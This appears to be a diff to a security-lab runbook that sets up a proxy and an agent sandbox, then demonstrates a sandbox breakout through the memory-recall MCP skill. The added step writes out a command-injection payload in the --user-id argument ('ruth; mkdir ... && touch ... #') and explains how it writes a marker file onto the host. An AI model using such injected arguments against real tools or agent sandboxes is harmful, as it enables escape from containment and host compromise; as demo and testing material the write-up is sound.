@@ -515,16 +515,16 @@ are up.)
 3. **[Terminal 3 — dedicated, stays running] roundhouse**, both legs. Also blocks in the foreground
    for as long as roundhouse serves; open another fresh terminal for it:
    ```bash
-   export INFERENCE_API_KEY=...              # from breakout-lab/.env
-   export ROUNDHOUSE_CATALOG=.../sandbox-breach/catalog.json
-   export ROUNDHOUSE_CONTROL_PLANE=.../sandbox-breach/control-plane.json
+   export INFERENCE_API_KEY=...              # from breakout-lab/.env   
+   export ROUNDHOUSE_CATALOG=/home/ubuntu/roundhouse/use-cases/sandbox-breach/catalog.json
+   export ROUNDHOUSE_CONTROL_PLANE=/home/ubuntu/roundhouse/use-cases/sandbox-breach/control-plane.json
    export ROUNDHOUSE_ADDR=0.0.0.0:8080
    export ROUNDHOUSE_FRONTIER_UPSTREAM=openai_responses   # means "dispatch for real"
    export ROUNDHOUSE_LOCAL_ENDPOINT=http://127.0.0.1:8000
    export ROUNDHOUSE_LOCAL_MODEL=Qwen/Qwen2.5-7B-Instruct
-   export ROUNDHOUSE_LOCAL_TOKENIZER=/path/to/.../tokenizer.json
+   export ROUNDHOUSE_LOCAL_TOKENIZER=/home/ubuntu/.cache/huggingface/hub/models--Qwen--Qwen2.5-7B-Instruct/snapshots/a09a35458c702b33eeacc393d103063234e8bc28/tokenizer.json
    export ROUNDHOUSE_LOCAL_KV_EVENTS_ENDPOINT=tcp://127.0.0.1:20080
-   ./target/release/roundhouse
+   /home/ubuntu/roundhouse/target/release/roundhouse
    ```
    Wait for `roundhouse listening addr=0.0.0.0:8080` in this terminal before moving on to step 4
    back in **Terminal 1** — steps 4 onward all depend on roundhouse already being up.
@@ -547,10 +547,20 @@ are up.)
    ```bash
    openshell sandbox upload sandbox-breach-demo \
      /home/ubuntu/breakout-lab/openshell/skills/memory-recall /sandbox/.claude/skills/memory-recall
-   openshell sandbox exec -n sandbox-breach-demo -- /sandbox/.venv/bin/python3 -m pip install -q fastmcp
-   openshell sandbox exec -n sandbox-breach-demo --workdir /sandbox/.claude/skills/memory-recall -- \
-     python3 recall.py --tool memory_agent --query "..." --user-id "ruth; <cmd> #"
+   openshell sandbox exec -n sandbox-breach-demo -- \
+     /sandbox/.venv/bin/python3 -m pip install -q fastmcp
+   openshell sandbox exec -n sandbox-breach-demo \
+     --workdir /sandbox/.claude/skills/memory-recall/memory-recall -- \
+     python3 recall.py --tool memory_agent \
+       --query "What do you remember about my past sessions?" \
+       --user-id "ruth; mkdir -p /workspace/openshell/host_breakout_marker && touch /workspace/openshell/host_breakout_marker/MARKINJECT_BREAKOUT_demo #"
    ```
+   The `--user-id` is the injection payload. Inside the memory-mcp container `/workspace` maps to
+   `/home/ubuntu/breakout-lab` on the host, so the injected `touch` writes a file the host can
+   read. The `#` comments out the `.jsonl` suffix `memory_mcp_server.py` appends to the path.
+   Note: `openshell sandbox upload` without a trailing slash on the source nests the directory, so
+   `recall.py` lands at `/sandbox/.claude/skills/memory-recall/memory-recall/recall.py` — the
+   `--workdir` above accounts for this.
 7. **[Terminal 1] Verify on the host**: `cat /home/ubuntu/breakout-lab/openshell/host_breakout_marker/MARKINJECT_BREAKOUT_*`
 8. **[Terminal 1, optional] chain NeMo Relay in front of roundhouse** — this one also returns
    control when the agent's reply is printed, so it's fine to run from Terminal 1:
@@ -574,8 +584,12 @@ See `GAPS.md` for the full table with remedies; in short, as of this run:
 - **`openai_chat_completions` dispatch** — this roundhouse build has no client for it; worked around
   by using `anthropic_messages` against the same endpoint (§2). A real fix belongs in
   `roundhouse-fleet`, not this use case.
-- **Two candidate replacement chat models** for `memory_mcp_server.py`'s separately-EOL LLM both
-  404 as not-entitled on this account — doesn't block either exploit (§1 addendum), left as-is.
+- **`memory_mcp_server.py` LLM** — **fixed** (2026-10-01). Original model
+  `nvidia/llama-3.3-nemotron-super-49b-v1.5` was EOL 2026-08-26. Replaced with
+  `meta/llama-3.2-11b-vision-instruct` via `integrate.api.nvidia.com` using `NVIDIA_API_KEY`
+  (already in `/home/ubuntu/breakout-lab/.env`, baked into the image at build time). Switched from
+  `ChatNVIDIA` to `ChatOpenAI` (`langchain-openai` now added to `Dockerfile.memory-mcp`).
+  A fresh `docker compose --build` picks all of this up automatically — no manual patching needed.
 
 Everything else the earlier version of this list named — NeMo Relay's persisted ATOF export, the
 scripted multi-terminal run, `PLAN.md`/`GAPS.md` — is done; see §6's addendum, `run.sh`, and
